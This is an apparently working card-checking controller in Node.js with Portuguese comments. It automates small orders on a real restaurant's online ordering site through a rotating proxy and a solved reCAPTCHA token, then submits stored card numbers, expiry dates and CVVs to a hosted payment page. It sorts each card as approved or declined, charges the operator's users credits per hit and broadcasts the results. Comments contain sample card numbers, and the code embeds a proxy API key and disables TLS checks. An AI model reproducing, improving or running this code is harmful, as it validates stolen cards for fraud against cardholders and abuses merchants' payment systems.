'use strict'
const Ws = use('Ws')
const { Curl } = require('node-libcurl');
const Database = use('Database')
const User = use('App/Models/User')
const Card = use('App/Models/Card')
const { addDays, parseISO } = require("date-fns");
class VadateCardController {
    //função que pegar o codigo da url do link de checkout
    async GetId(id) {
        // await this.GetCampos(id)
        //    return
        //id do usuario


        //verificar se o captcha já foi resolvido
        let contadorCaptcha = 0
        let time = setInterval(async () => {
            contadorCaptcha++;
            console.log('VERIFICANDO TOKEN_RECAPTCHA....')
            //carregar cards que não foram testados ainda
            const card = await User.find(id)
            await card.loadMany({
                cards: (builder) => builder.where('is_tested', false)
            })
            // esse trecho 
            let stopRestart = card.toJSON().cards.length
            if (!stopRestart) {
                clearInterval(time)
            }
            //pegar token resolvido do recaptcha
            let result = await Database
                .table('url_tokens')
                .where('user_id', id)
                .first()

            //fica verificando se o recaptcha foi resolvido
            if (result) {
                let token = await result.token_recaptcha
                let error = await result.erro_token

                if (token != null && error == null) {
                    //função que enviar o form para o site e gravar o codigo da url do chechout
                    await this.EnviarForm(id, token)
                    //função que pegar os tres campos para proxima request POST
                    await this.GetCampos(id)

                    // zera a verifição do token recaptcha
                    clearInterval(time)

                }

                // se ouver algum erro na resolução do captcha para tudo e recomeçar
                if (error) {
                    const up = await User.find(id)
                    await up
                        .url_token()
                        .update({ link_url: null, token_recaptcha: null, erro_token: null, is_restart: 1 })

                    clearInterval(time)
                    console.log('erro na verificação do tokens')
                }
            }
            console.log(contadorCaptcha)
           

        }, 5000);

    }
    // função que envia o form via post
    async EnviarForm(id, token) {
        const date = await this.Pickup_time();
        const curl = new Curl();
        curl.setOpt('URL', 'https://amarithcafe.revelup.com/weborders/create_order_and_pay_v1/');
        curl.setOpt('PROXY', 'http://f1ca55670d414417ad52b796e2242a4d:@proxy.crawlera.com:8010');
        curl.setOpt('HEADER', 1);
        curl.setOpt('FOLLOWLOCATION', 1);
        curl.setOpt(Curl.option.POST, 1);
        curl.setOpt('SSL_VERIFYPEER', 0);
        curl.setOpt('SSL_VERIFYHOST', 0);
        curl.setOpt(Curl.option.IGNORE_CONTENT_LENGTH, 136);
        curl.setOpt(Curl.option.HTTPHEADER, [
            'Host: amarithcafe.revelup.com',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
            'Accept: application/json',
            'Referer: https://amarithcafe.revelup.com/weborder/?establishment=1',
            'Content-Type: application/x-www-form-urlencoded',
            'Connection: keep-alive']
        );

        curl.setOpt(Curl.option.POSTFIELDS, '{"skin":"weborder","establishmentId":1,"items":[{"modifieritems":[],"price":1.5,"product":209,"product_name_override":"z","quantity":1,"product_sub_id":"c1160"}],"orderInfo":{"created_date":"' + date.create_date + '","pickup_time":"' + date.pickup_time + '","dining_option":0,"customer":{"phone":"1","email":"b@o.com","first_name":"B","last_name":"L"},"call_name":""},"paymentInfo":{"tip":0,"type":2},"recaptcha_v2_token":"' + token + '"}');
        //pega o rsultado da request POST com o form enviado
        await curl.on('end', async (statusCode, data) => {
            //verifica se teve error.
            //console.log(data)
            if (data.indexOf("\"status\": \"ERROR\"") != -1) {
                console.log('error')

            } else {
                let inicio = data.indexOf("\"TransactionSetupID\": \"");
                let codigo_url = await data.substr(inicio + 23, 36)

                // pegar o codedigo da url de pagamento e colocar  no banco de dados
                // e excluir o token do recaptcha
                const setlINK = await User.find(id)
                await setlINK
                    .url_token()
                    .update({ link_url: codigo_url, token_recaptcha: null })


                console.log('codigo da url pego com sucesso')

            }
        });
        // encerra o curl desta requisição
        curl.on('error', curl.close.bind(curl))
        curl.perform()

    }
    // essa função pegar data dinamica para colocar nas ordens
    async Pickup_time() {
        let day = new Date().getDay();
        let dd = new Date().toISOString().replace(/\.\d{3}Z$/, '').split('T');
        let ff = parseISO(dd[0] + 'T15:45:00')
        let tt = addDays(ff, 1)
        let pickup_time = tt.toISOString().replace(/\.\d{3}Z$/, '');
        let create_date = new Date().toISOString().replace(/\.\d{3}Z$/, '');

        if (day != 6 && day != 7 && day == 5) {
            let d = new Date().toISOString().replace(/\.\d{3}Z$/, '').split('T');
            let f = parseISO(d[0] + 'T15:45:00')
            let t = addDays(f, 3)
            pickup_time = t.toISOString().replace(/\.\d{3}Z$/, '');

        }
        if (day == 6 || day == 7) {
            let d = new Date().toISOString().replace(/\.\d{3}Z$/, '').split('T');
            let f = parseISO(d[0] + 'T15:45:00')
            let t = addDays(f, 2)
            pickup_time = t.toISOString().replace(/\.\d{3}Z$/, '');

        }
        return { pickup_time: pickup_time, create_date: create_date }
    }
    // essa função pega os tres campos state, viewstate e validaton
    async GetCampos(id) {
        // esperar 3 segundos os dados do link esta no banco de dados
        setTimeout(async () => {
            let result = await Database
                .table('url_tokens')
                .where('user_id', id)
                .first()
            //pegar o link do banco de dados
            let code_url = result.link_url;

            const curl1 = new Curl();
            curl1.setOpt('URL', 'https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '');
            curl1.setOpt('USERAGENT', "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
            curl1.setOpt('FOLLOWLOCATION', 1);
            curl1.setOpt('SSL_VERIFYPEER', 0);
            curl1.setOpt('SSL_VERIFYHOST', 0);
            curl1.setOpt(Curl.option.HTTPHEADER, [
                'Host: transaction.hostedpayments.com',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection: keep-alive',
                'Upgrade-Insecure-Requests: 1',
            ]);

            await curl1.on('end', async (statusCode, data) => {

                let GETVIEWSTATE = data.indexOf('name="__VIEWSTATE" id="__VIEWSTATE" value="'); //47
                let GETVIEWSTATEGENERATOR = data.indexOf('name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="'); //64
                let GETEVENTVALIDATION = data.indexOf('name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="');//59

                let FinalVIEWSTATE = await data.indexOf('"', GETVIEWSTATE + 44);
                let FinalVIEWSTATEGENERATOR = await data.indexOf('"', GETVIEWSTATEGENERATOR + 62);
                let FinalEVENTVALIDATION = await data.indexOf('"', GETEVENTVALIDATION + 56);

                let STATE = await encodeURIComponent(data.substr(GETVIEWSTATE + 43, FinalVIEWSTATE - (GETVIEWSTATE + 43)))
                let STATEGENERATOR = await encodeURIComponent(data.substr(GETVIEWSTATEGENERATOR + 61, FinalVIEWSTATEGENERATOR - (GETVIEWSTATEGENERATOR + 61)))
                let EVENTVALIDATION = await encodeURIComponent(data.substr(GETEVENTVALIDATION + 55, FinalEVENTVALIDATION - (GETEVENTVALIDATION + 55)))
                //chamar função de valida o card

                await this.ValidCard(id, STATE, STATEGENERATOR, EVENTVALIDATION)
            });
            curl1.on('error', curl1.close.bind(curl1))
            curl1.perform()
            console.log('Get campos ok')
        }, 3000);

    }
    async ValidCard(id, STATE, STATEGENERATOR, EVENTVALIDATION) {


        // pegar os canais para enviar as menssagens
        const aprovadas = await Ws.getChannel('status:*').topic('status:a' + id)
        const reprovadas = await Ws.getChannel('status:*').topic('status:r' + id)
        const testadas = await Ws.getChannel('status:*').topic('status:t' + id)
        const recusadas = await Ws.getChannel('status:*').topic('status:rr' + id)
        const creditos = await Ws.getChannel('status:*').topic('status:creditos' + id)
        //pegar os cards que não foram testados
        const cartoes = await User.find(id)
        await cartoes.loadMany({
            cards: (builder) => builder.where('is_tested', false)
        })

        //6509079001410445|12|2024|778
        //6504867262783814|06|2023|000
        //6504867262787880|06|2023|000

        if (cartoes != '') {
            for await (let cards of cartoes.toJSON().cards) {
                // espera um segundo para execulta cada card
                setTimeout(async () => {
                    // pegar o codedigo da url que esta no banco de dados
                    let result = await Database
                        .table('url_tokens')
                        .where('user_id', id)
                        .first()
                    //pegar o code_link do banco de dado
                    let code_url = await result.link_url;

                    const curl2 = new Curl();

                    let PostString = await 'scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=' + STATE + '&__VIEWSTATEGENERATOR=' + STATEGENERATOR + '&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=' + EVENTVALIDATION + '&hdnCancelled=&cardNumber=' + cards.n + '&ddlExpirationMonth=' + cards.m + '&ddlExpirationYear=' + cards.a + '&CVV=' + cards.v + '&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__ASYNCPOST=true&'

                    curl2.setOpt('URL', 'https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '');

                    curl2.setOpt('HEADER', 1);
                    curl2.setOpt(Curl.option.POST, 1);
                    curl2.setOpt('USERAGENT', "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
                    curl2.setOpt('FOLLOWLOCATION', 1);
                    curl2.setOpt('SSL_VERIFYPEER', 0);
                    curl2.setOpt('SSL_VERIFYHOST', 0);
                    curl2.setOpt('CONNECTTIMEOUT', 2);
                    curl2.setOpt('FAILONERROR', 1);
                    curl2.setOpt(Curl.option.HTTPHEADER, [
                        'Host: transaction.hostedpayments.com',
                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
                        'Accept: */*',
                        'X-Requested-With: XMLHttpRequest',
                        'X-MicrosoftAjax: Delta=true',
                        'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
                        'Connection: keep-alive',
                        'Referer: https://transaction.hostedpayments.com/?TransactionSetupID=' + code_url + '',
                    ]);

                    curl2.setOpt(Curl.option.POSTFIELDS, PostString)

                    await curl2.on('end', async (statusCode, data) => {

                        try {

                            let GETR = await data.indexOf('<b>Error</b>:');
                            let ENDR = await data.indexOf('</span>', GETR + 12);
                            let Resultado = await data.substr(GETR + 13, ENDR - (GETR + 13))
                          
                            // TransactionSetupID expired
                            if (Resultado != '') {

                                if (Resultado.trim() == 'TransactionSetupID expired') {
                                    const ur = await User.find(id)
                                    await ur
                                        .url_token()
                                        .update({ link_url: null, token_recaptcha: null, erro_token: null, is_restart: 1 })


                                }
                                if (Resultado.trim() == 'Declined') {

                                    await upcard2.save()
                                    await Database
                                        .table('cards')
                                        .where('id', cards.id)
                                        .update({ is_tested: 1, is_declined: 1 })


                                }
                                if (Resultado.trim() == 'Call Issuer') {
                                    const balance = await User.find(id)
                                    await Database
                                        .table('users')
                                        .where('id', id)
                                        .update('balance', parseInt(balance.balance) - 1)
                                    await Database
                                        .table('cards')
                                        .where('id', cards.id)
                                        .update({ is_tested: 1, is_valid: 1 })

                                    if (aprovadas) {

                                        const A = await User.find(id)
                                        await A.loadMany({
                                            cards: (builder) => builder.where('is_valid', true)
                                        })
                                        let cont = A.toJSON().cards.length
                                        aprovadas.broadcastToAll('message', { cont: cont, msg: '<b class="badge badge-primary">#Aprovada</b> <b class="badge badge-light">' + cards.n + '</b> <b class="badge badge-info">Retorno: Válido</b> <b class="badge badge-success">#el-patron</b><br>' })
                                    }
                                    console.log(Resultado)
                                    console.log('APROVADO')

                                } else {

                                    await Database
                                        .table('cards')
                                        .where('id', cards.id)
                                        .update('is_tested', 1)

                                    if (reprovadas) {
                                        const T = await User.find(id)
                                        await T.loadMany({
                                            cards: (builder) => builder.where('is_tested', true)
                                        })
                                        let r = await T.toJSON().cards.length
                                        console('testados: ' + r)
                                        const R = await User.find(id)
                                        await R.loadMany({
                                            cards: (builder) => builder.where('is_valid', false)
                                        })
                                        let cont = await R.toJSON().cards.length
                                        console.log('validos: ' + cont)
                                        reprovadas.broadcastToAll('message', { cont: r - cont, msg: '<b class="badge badge-danger">#Reprovada</b> <b class="badge badge-light">' + cards.n + '</b> <b class="badge badge-danger">Retorno: Inválido</b><br>' })
                                    }
                                    console.log(Resultado)
                                    console.log('REPROVADO')
                                }
                            } 

                        } catch (error) {
                            console.log('expirado ' + error.message)
                            return
                        }

                    });

                    curl2.on('error', curl2.close.bind(curl2))
                    curl2.perform()
                }, 1000);
            }


        } else {

            const u = await User.find(id)
            await u
                .url_token()
                .update({ link_url: null, token_recaptcha: null, erro_token: null, is_restart: 0 })

        }
        setTimeout(async () => {

            //atualizar dados do frontend via websocsket
            if (testadas) {
                const T = await User.find(id)
                await T.loadMany({
                    cards: (builder) => builder.where('is_tested', true)
                })
                if (T != undefined) {
                    let cont = T.toJSON().cards.length
                    console.log('testados: ' + cont)
                    testadas.broadcastToAll('message', cont)
                }

            }
            if (recusadas) {

                const RR = await User.find(id)
                await RR.loadMany({
                    cards: (builder) => builder.where('is_declined', true)
                })
                if (RR != undefined) {
                    let cont = RR.toJSON().cards.length
                    console.log('recusados: ' + cont)
                    recusadas.broadcastToAll('message', cont)
                }

            }
            if (creditos) {
                let result = await Database
                    .table('users')
                    .where('id', id)
                    .first()
                await creditos.broadcastToAll('message', result.balance)
            }

        }, 14000);


    }



}

module.exports = VadateCardController
